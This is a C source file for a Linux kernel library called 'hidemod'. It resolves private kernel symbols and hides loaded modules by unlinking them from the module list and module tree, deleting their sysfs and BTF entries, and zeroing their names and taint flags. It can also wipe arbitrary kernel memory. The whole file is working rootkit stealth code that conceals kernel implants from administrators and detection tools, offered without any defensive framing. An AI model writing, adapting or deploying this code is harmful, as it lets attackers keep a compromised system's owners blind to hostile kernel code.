/* SPDX-License-Identifier: GPL-2.0-only */
/*
 * Copyright (C) 2026 dere3046
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/rcupdate.h>
#include <linux/mutex.h>
#include <linux/sysfs.h>
#include <linux/workqueue.h>
#include <linux/string.h>

#include "hidemod.h"

typedef void (*hm_mod_tree_fn)(struct module *mod);

struct hm_ctx {
	const struct hm_resolver *res;
	struct mutex *module_mutex;
	struct list_head *anchor_modules;
	unsigned long fn_tree_insert;
	unsigned long fn_tree_remove;
	struct kobject *btf_kobj;
	struct work_struct hide_work;
	struct hm_obj objs[HM_OBJ_MAX];
	size_t num_objs;
	unsigned long actions;
	bool hidden;
};

static struct hm_ctx ctx_st;

static int hm_resolve_ctx(struct hm_ctx *ctx)
{
	if (!ctx->res->name_to_addr)
		return -EINVAL;
	ctx->module_mutex =
		(struct mutex *)ctx->res->name_to_addr("module_mutex");
	ctx->anchor_modules =
		(struct list_head *)ctx->res->name_to_addr("modules");
	ctx->fn_tree_insert = ctx->res->name_to_addr("mod_tree_insert");
	ctx->fn_tree_remove = ctx->res->name_to_addr("mod_tree_remove");
	ctx->btf_kobj = (struct kobject *)ctx->res->name_to_addr("btf_kobj");
	return 0;
}

static void hm_del_btf_file(struct hm_ctx *ctx, struct module *mod)
{
	struct bin_attribute attr;

	if (!ctx->btf_kobj)
		return;
	sysfs_bin_attr_init(&attr);
	attr.attr.name = mod->name;
	sysfs_remove_bin_file(ctx->btf_kobj, &attr);
}

static int hm_hide_module(struct hm_ctx *ctx, struct hm_obj *obj)
{
	struct module *mod = obj->u.mod;
	struct list_head *anchor;

	anchor = obj->anchor ? obj->anchor : ctx->anchor_modules;
	if (!anchor)
		return -ENOENT;

	if (ctx->actions & HM_ACT_LIST) {
		list_del_rcu(&mod->list);
		synchronize_rcu();
	}
	if (ctx->actions & HM_ACT_SYSFS)
		kobject_del(&mod->mkobj.kobj);
	if (ctx->actions & HM_ACT_BTF)
		hm_del_btf_file(ctx, mod);
	if ((ctx->actions & HM_ACT_MOD_TREE) && ctx->fn_tree_remove)
		((hm_mod_tree_fn)ctx->fn_tree_remove)(mod);
	if ((ctx->actions & HM_ACT_FIELDS) && mod->name[0]) {
		memset(mod->name, 0, strlen(mod->name));
		mod->state = MODULE_STATE_LIVE;
		mod->taints = 0;
	}
	return 0;
}

static void hm_unhide_module(struct hm_ctx *ctx, struct hm_obj *obj)
{
	struct module *mod = obj->u.mod;
	struct list_head *anchor;

	if ((ctx->actions & HM_ACT_MOD_TREE) && ctx->fn_tree_insert)
		((hm_mod_tree_fn)ctx->fn_tree_insert)(mod);
	anchor = obj->anchor ? obj->anchor : ctx->anchor_modules;
	if ((ctx->actions & HM_ACT_LIST) && anchor && list_empty(&mod->list))
		list_add(&mod->list, anchor);
}

static int hm_hide_obj(struct hm_ctx *ctx, struct hm_obj *obj)
{
	switch (obj->type) {
	case HM_OBJ_MODULE:
		return hm_hide_module(ctx, obj);
	case HM_OBJ_LIST:
		list_del_rcu(obj->u.list);
		synchronize_rcu();
		break;
	case HM_OBJ_KOBJ:
		kobject_del(obj->u.kobj);
		break;
	case HM_OBJ_MOD_TREE:
		if (ctx->fn_tree_remove)
			((hm_mod_tree_fn)ctx->fn_tree_remove)(obj->u.mod);
		break;
	case HM_OBJ_ZERO:
		memset((void *)obj->u.addr, 0, obj->size);
		break;
	}
	return 0;
}

static void hm_hide_work(struct work_struct *w)
{
	struct hm_ctx *ctx = container_of(w, struct hm_ctx, hide_work);
	size_t i;
	int ret;

	if (ctx->module_mutex)
		mutex_lock(ctx->module_mutex);
	for (i = 0; i < ctx->num_objs; i++) {
		ret = hm_hide_obj(ctx, &ctx->objs[i]);
		if (ret)
			break;
	}
	if (ctx->module_mutex)
		mutex_unlock(ctx->module_mutex);
	if (ret)
		pr_warn("[hidemod] hide failed ret=%d\n", ret);
}

int hm_init(const struct hm_resolver *res)
{
	if (!res)
		return -EINVAL;
	memset(&ctx_st, 0, sizeof(ctx_st));
	ctx_st.res = res;
	ctx_st.actions = HM_ACT_USER;
	INIT_WORK(&ctx_st.hide_work, hm_hide_work);
	return hm_resolve_ctx(&ctx_st);
}

void hm_exit(void)
{
	flush_work(&ctx_st.hide_work);
	memset(&ctx_st, 0, sizeof(ctx_st));
}

static int hm_add_obj(struct hm_obj *obj)
{
	if (ctx_st.num_objs >= HM_OBJ_MAX)
		return -ENOSPC;
	ctx_st.objs[ctx_st.num_objs++] = *obj;
	return 0;
}

int hm_add_module(struct module *mod, struct list_head *anchor)
{
	struct hm_obj obj = {
		.type = HM_OBJ_MODULE,
		.u.mod = mod,
		.anchor = anchor,
	};

	return hm_add_obj(&obj);
}

int hm_add_list(struct list_head *node, struct list_head *anchor)
{
	struct hm_obj obj = {
		.type = HM_OBJ_LIST,
		.u.list = node,
		.anchor = anchor,
	};

	return hm_add_obj(&obj);
}

int hm_add_kobj(struct kobject *kobj)
{
	struct hm_obj obj = {
		.type = HM_OBJ_KOBJ,
		.u.kobj = kobj,
	};

	return hm_add_obj(&obj);
}

int hm_add_mod_tree(struct module *mod)
{
	struct hm_obj obj = {
		.type = HM_OBJ_MOD_TREE,
		.u.mod = mod,
	};

	return hm_add_obj(&obj);
}

int hm_add_zero(unsigned long addr, size_t size)
{
	struct hm_obj obj = {
		.type = HM_OBJ_ZERO,
		.u.addr = addr,
		.size = size,
	};

	return hm_add_obj(&obj);
}

void hm_clear_objs(void)
{
	ctx_st.num_objs = 0;
}

void hm_set_actions(unsigned long mask)
{
	ctx_st.actions = mask;
}

int hm_hide(void)
{
	struct hm_ctx *ctx = &ctx_st;

	if (!ctx->res)
		return -EINVAL;
	if (ctx->hidden)
		return 0;

	schedule_work(&ctx->hide_work);
	ctx->hidden = true;
	return 0;
}

int hm_unhide(void)
{
	struct hm_ctx *ctx = &ctx_st;
	size_t i;

	if (!ctx->res || !ctx->hidden)
		return 0;

	flush_work(&ctx->hide_work);
	if (ctx->module_mutex)
		mutex_lock(ctx->module_mutex);
	for (i = 0; i < ctx->num_objs; i++) {
		struct hm_obj *obj = &ctx->objs[i];

		if (obj->type == HM_OBJ_MODULE)
			hm_unhide_module(ctx, obj);
		else if (obj->type == HM_OBJ_LIST && obj->anchor)
			list_add(obj->u.list, obj->anchor);
	}
	if (ctx->module_mutex)
		mutex_unlock(ctx->module_mutex);
	ctx->hidden = false;
	return 0;
}

bool hm_hidden(void)
{
	return ctx_st.hidden;
}
